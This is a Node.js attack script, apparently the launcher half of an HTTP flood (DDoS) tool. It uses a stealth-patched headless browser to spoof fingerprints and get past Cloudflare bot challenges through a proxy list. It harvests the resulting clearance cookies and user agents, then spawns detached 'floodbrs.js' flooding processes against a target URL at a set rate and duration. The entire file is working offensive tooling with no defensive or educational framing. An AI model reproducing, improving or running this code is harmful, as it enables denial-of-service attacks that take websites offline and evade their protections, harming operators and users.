const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const async = require('async');
const { spawn, exec  } = require('child_process');

puppeteer.use(StealthPlugin());

const COOKIES_MAX_RETRIES = 3;
const COLORS = {
    RED: '\x1b[31m',
    PINK: '\x1b[35m',
    WHITE: '\x1b[37m',
    YELLOW: '\x1b[33m',
    GREEN: '\x1b[32m',
    RESET: '\x1b[0m'
};

// ========== PRAGMATIC CHALLENGE SOLVING ==========
const bypassFirewall = async (page) => {
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'plugins', { 
            get: () => [
                {0: {type: "application/x-google-chrome-pdf"}, name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format"},
                {0: {type: "application/pdf"}, name: "Chrome PDF Viewer", filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai", description: "Portable Document Format"}
            ] 
        });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        
        window.chrome = { 
            runtime: {
                connect: () => ({onMessage: {addListener: () => {}}, postMessage: () => {}, onDisconnect: {addListener: () => {}}}),
                sendMessage: () => {},
                onMessage: {addListener: () => {}},
                onConnect: {addListener: () => {}},
                getManifest: () => ({}),
                id: 'testid'
            }, 
            loadTimes: () => ({
                finishDocumentLoadTime: 0,
                finishLoadTime: 0,
                firstPaintTime: 0,
                requestTime: 0,
                startLoadTime: 0,
                commitLoadTime: 0
            }), 
            csi: () => ({onloadT: Date.now(), startE: Date.now() - 1000, pageT: 1200}), 
            app: {
                isInstalled: false,
                InstallState: {DISABLED: 'disabled', INSTALLED: 'installed', NOT_INSTALLED: 'not_installed'},
                RunningState: {CANNOT_RUN: 'cannot_run', READY_TO_RUN: 'ready_to_run', RUNNING: 'running'}
            }
        };
        
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => (
            parameters.name === 'notifications' ?
                Promise.resolve({ state: Notification.permission }) :
                originalQuery(parameters)
        );

        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 8 });
        Object.defineProperty(navigator, 'deviceMemory', { value: 8 });
        Object.defineProperty(navigator, 'maxTouchPoints', { value: 5 });
        
        Object.defineProperty(document, 'hidden', { value: false });
        Object.defineProperty(document, 'visibilityState', { value: 'visible' });
        
        delete window.__webdriver_evaluate;
        delete window.__selenium_evaluate;
        delete window.__webdriver_script_function;
        delete window.__webdriver_script_func;
        delete window.__webdriver_script_fn;
        delete window._Selenium_IDE_Recorder;
        delete window._selenium;
        delete window.callPhantom;
        delete window.callSelenium;
        delete window.phantom;
        delete window.webdriver;
        delete window.selenium;
        delete window._phantom;
    });
};

const getFirewallBypassArgs = () => [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-accelerated-2d-canvas',
    '--disable-gpu',
    '--disable-blink-features=AutomationControlled',
    '--disable-infobars',
    '--no-zygote',
    '--single-process',
    '--disable-background-timer-throttling',
    '--disable-renderer-backgrounding',
    '--enable-features=NetworkService,NetworkServiceInProcess',
    '--ignore-certificate-errors',
    '--ignore-ssl-errors',
    '--disable-web-security',
    '--disable-features=site-per-process',
    '--disable-ipc-flooding-protection',
    '--disable-backgrounding-occluded-windows',
    '--disable-default-apps',
    '--disable-extensions',
    '--disable-translate',
    '--disable-xss-auditor',
    '--no-pings',
    '--use-gl=swiftshader',
    '--disable-software-rasterizer',
    '--no-default-browser-check',
    '--disable-background-networking',
    '--disable-client-side-phishing-detection',
    '--disable-sync',
    '--disable-hang-monitor',
    '--disable-prompt-on-repost',
    '--disable-domain-reliability',
    '--disable-component-update',
    '--aggressive-cache-discard',
    '--max_old_space_size=4096'
];

// SIMPLE & EFFECTIVE CHALLENGE SOLVING
const solveAdvancedChallenge = async (page, browserProxy) => {
    try {
        coloredLog(COLORS.WHITE, `[INFO] Checking for challenge: ${maskProxy(browserProxy)}`);
        
        // Wait a bit for page to stabilize
        await sleep(3);
        
        // Check current state
        const currentUrl = page.url();
        const title = await page.title().catch(() => '');
        
        // Simple challenge detection
        const isChallenge = title.includes('Just a moment') || 
                           title.includes('Checking your browser') ||
                           currentUrl.includes('challenges.cloudflare.com');

        if (!isChallenge) {
            coloredLog(COLORS.GREEN, `[INFO] No challenge detected: ${maskProxy(browserProxy)}`);
            return true;
        }

        coloredLog(COLORS.YELLOW, `[INFO] Challenge found, solving: ${maskProxy(browserProxy)}`);

        // STRATEGY 1: Wait for auto-redirect (most common case)
        coloredLog(COLORS.WHITE, `[INFO] Strategy 1: Waiting for auto-solve`);
        await sleep(8);
        
        // Check if solved after waiting
        const newTitle = await page.title().catch(() => '');
        const newUrl = page.url();
        if (!newTitle.includes('Just a moment') && !newTitle.includes('Checking your browser')) {
            coloredLog(COLORS.GREEN, `[INFO] Auto-solve successful: ${maskProxy(browserProxy)}`);
            return true;
        }

        // STRATEGY 2: Look for and click the main challenge button
        coloredLog(COLORS.WHITE, `[INFO] Strategy 2: Looking for challenge button`);
        
        const challengeButtons = [
            // Cloudflare specific
            'input[type="submit"][value*="Verify"]',
            'button[type*="submit"]',
            '.btn',
            '#challenge-submit',
            '[type="submit"]',
            // General buttons
            'button',
            'input[type="submit"]',
            'a[href*="challenge"]',
            '.verify-btn',
            '.success-button'
        ];

        for (const selector of challengeButtons) {
            try {
                const button = await page.$(selector);
                if (button) {
                    coloredLog(COLORS.YELLOW, `[INFO] Found button with selector: ${selector}`);
                    
                    // Simple click without complex movements
                    await button.click().catch(() => {});
                    await sleep(5);
                    
                    // Check if solved
                    const postClickTitle = await page.title().catch(() => '');
                    if (!postClickTitle.includes('Just a moment') && !postClickTitle.includes('Checking your browser')) {
                        coloredLog(COLORS.GREEN, `[INFO] Button click solved: ${maskProxy(browserProxy)}`);
                        return true;
                    }
                }
            } catch (e) {}
        }

        // STRATEGY 3: Check for iframe challenges
        coloredLog(COLORS.WHITE, `[INFO] Strategy 3: Checking iframes`);
        try {
            const frames = await page.frames();
            for (const frame of frames) {
                try {
                    const frameUrl = frame.url();
                    if (frameUrl.includes('challenge') || frameUrl.includes('captcha')) {
                        coloredLog(COLORS.YELLOW, `[INFO] Found challenge iframe: ${frameUrl}`);
                        
                        // Try to find and click any button in the iframe
                        const iframeButton = await frame.$('button, input[type="submit"]');
                        if (iframeButton) {
                            await iframeButton.click().catch(() => {});
                            await sleep(5);
                            
                            const postIframeTitle = await page.title().catch(() => '');
                            if (!postIframeTitle.includes('Just a moment') && !postIframeTitle.includes('Checking your browser')) {
                                coloredLog(COLORS.GREEN, `[INFO] Iframe click solved: ${maskProxy(browserProxy)}`);
                                return true;
                            }
                        }
                    }
                } catch (e) {}
            }
        } catch (e) {}

        // STRATEGY 4: Simple form interaction
        coloredLog(COLORS.WHITE, `[INFO] Strategy 4: Form interaction`);
        try {
            const textInputs = await page.$$('input[type="text"], input[type="email"], textarea');
            for (const input of textInputs.slice(0, 2)) {
                try {
                    await input.click().catch(() => {});
                    await sleep(1);
                    await input.type('verify', { delay: 100 }).catch(() => {});
                    await sleep(2);
                    
                    // Find and click submit
                    const submitBtn = await page.$('input[type="submit"], button[type="submit"]');
                    if (submitBtn) {
                        await submitBtn.click().catch(() => {});
                        await sleep(5);
                        
                        const postFormTitle = await page.title().catch(() => '');
                        if (!postFormTitle.includes('Just a moment') && !postFormTitle.includes('Checking your browser')) {
                            coloredLog(COLORS.GREEN, `[INFO] Form submission solved: ${maskProxy(browserProxy)}`);
                            return true;
                        }
                    }
                } catch (e) {}
            }
        } catch (e) {}

        // STRATEGY 5: Final attempt - refresh and wait
        coloredLog(COLORS.WHITE, `[INFO] Strategy 5: Refresh and wait`);
        await page.reload().catch(() => {});
        await sleep(10);
        
        const finalTitle = await page.title().catch(() => '');
        const finalUrl = page.url();
        
        if (!finalTitle.includes('Just a moment') && 
            !finalTitle.includes('Checking your browser') &&
            !finalUrl.includes('challenges.cloudflare.com')) {
            coloredLog(COLORS.GREEN, `[INFO] Refresh solved: ${maskProxy(browserProxy)}`);
            return true;
        }

        coloredLog(COLORS.RED, `[INFO] All strategies failed: ${maskProxy(browserProxy)}`);
        return false;

    } catch (error) {
        coloredLog(COLORS.RED, `[INFO] Solver error: ${error.message}`);
        return false;
    }
};

// Command-line argument validation
if (process.argv.length < 6) {
    console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let totalSolves = 0;

// Utility functions
const generateRandomString = (minLength, maxLength) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => 
        characters[Math.floor(Math.random() * characters.length)]
    ).join('');
};

const validKey = generateRandomString(5, 10);

const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        console.error('Error reading proxies file:', error.message);
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2 && parts[0].split('.').length === 4) {
        const ipParts = parts[0].split('.');
        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
    }
    return proxy;
};

process.on('SIGINT', () => {
    coloredLog(COLORS.YELLOW, '[INFO] Nhận tín hiệu Ctrl+C, đang kill processes...');
    
    exec('taskkill /f /im node.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill node.exe: ${err.message}`);
        } else {
            coloredLog(COLORS.GREEN, '[INFO] Đã kill node.exe processes');
        }
    });

    exec('taskkill /f /im msedge.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill msedge.exe: ${err.message}`);
        } else {
            coloredLog(COLORS.GREEN, '[INFO] Đã kill msedge.exe processes');
        }
    });

    setTimeout(() => {
        coloredLog(COLORS.GREEN, '[INFO] Exiting...');
        process.exit(0);
    }, 3000);
});

const coloredLog = (color, text) => {
    console.log(`${color}${text}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// User agents
const userAgents = [
    `Mozilla/5.0 (Linux; Android 12; SM-S928U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android 14; 23127PN0CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android 13; ASUS_AI2401) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android 14; CPH2551) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1`
];

// SIMPLIFIED Browser launch
const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxRetries = 2) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--window-size=360,640',
            `--user-agent=${userAgent}`,
            ...getFirewallBypassArgs()
        ],
        defaultViewport: {
            width: 360,
            height: 640,
            deviceScaleFactor: 2,
            isMobile: true,
            hasTouch: true,
            isLandscape: false
        },
        ignoreHTTPSErrors: true
    };

    try {
        coloredLog(COLORS.YELLOW, `[INFO] Launching: ${maskProxy(browserProxy)}`);
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        // Apply bypass
        await bypassFirewall(page);

        // Simple navigation with longer timeout
        await page.goto(targetURL, { 
            waitUntil: 'domcontentloaded',
            timeout: 60000 
        }).catch(() => {});

        // Solve challenge
        const challengeSolved = await solveAdvancedChallenge(page, browserProxy);
        
        if (!challengeSolved) {
            throw new Error('Challenge solving failed');
        }

        // Get cookies
        await sleep(2);
        const cookies = await page.cookies(targetURL).catch(() => []);
        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');

        if (!cookieString) {
            throw new Error('No cookies obtained');
        }

        coloredLog(COLORS.GREEN, `[INFO] SUCCESS: ${maskProxy(browserProxy)}`);
        totalSolves++;
        coloredLog(COLORS.GREEN, `[INFO] Total solves: ${totalSolves}`);

        await browser.close();
        return { cookies: cookieString, userAgent };
        
    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        if (attempt < maxRetries) {
            coloredLog(COLORS.YELLOW, `[INFO] Retrying... (${attempt}/${maxRetries})`);
            await sleep(3);
            return launchBrowserWithRetry(targetURL, browserProxy, attempt + 1, maxRetries);
        }
        coloredLog(COLORS.RED, `[INFO] Failed after ${maxRetries} attempts: ${maskProxy(browserProxy)}`);
        return null;
    }
};

// Thread handling
const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
    if (retries >= COOKIES_MAX_RETRIES) {
        done(null, { task });
        return;
    }

    try {
        const response = await launchBrowserWithRetry(targetURL, browserProxy);
        if (response) {
            const cookieInfo = JSON.stringify({
                Proxy: maskProxy(browserProxy),
                'User-agent': response.userAgent,
                cookie: response.cookies
            });
            console.log(cookieInfo);

            // Spawn flood process
            try {
                const floodProcess = spawn('node', [
                    'floodbrs.js',
                    targetURL,
                    duration.toString(),
                    rate,
                    threads.toString(),
                    proxyFile,
                    response.cookies,
                    response.userAgent,
                    validKey
                ], {
                    detached: true,
                    stdio: 'ignore'
                });

                floodProcess.unref();
                coloredLog(COLORS.GREEN, `[INFO] Flood process spawned: ${maskProxy(browserProxy)}`);
                
            } catch (error) {
                coloredLog(COLORS.RED, `[INFO] Spawn error: ${error.message}`);
            }

            done(null, { task });
        } else {
            await startThread(targetURL, browserProxy, task, done, retries + 1);
        }
    } catch (error) {
        await startThread(targetURL, browserProxy, task, done, retries + 1);
    }
};

// Queue setup
const queue = async.queue((task, done) => {
    startThread(targetURL, task.browserProxy, task, done);
}, threads);

queue.drain(() => {
    coloredLog(COLORS.GREEN, '[INFO] All proxies processed');
});

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        coloredLog(COLORS.RED, '[INFO] No proxies found');
        process.exit(1);
    }

    coloredLog(COLORS.GREEN, `[INFO] Starting with ${proxies.length} proxies`);

    proxies.forEach(browserProxy => queue.push({ browserProxy }));

    setTimeout(() => {
        coloredLog(COLORS.YELLOW, '[INFO] Time completed - cleaning up...');
        queue.kill();
        
        exec('pkill -f floodbrs.js', () => {});
        exec('pkill -f chrome', () => {});

        setTimeout(() => process.exit(0), 3000);
    }, duration * 1000);
};

process.on('uncaughtException', (error) => {
    coloredLog(COLORS.RED, `[UNCAUGHT] ${error.message}`);
});
process.on('unhandledRejection', (error) => {
    coloredLog(COLORS.RED, `[UNHANDLED] ${error.message}`);
});

coloredLog(COLORS.GREEN, '[INFO] Starting challenge solver...');
main().catch(err => {
    coloredLog(COLORS.RED, `[INFO] Main error: ${err.message}`);
    process.exit(1);
});
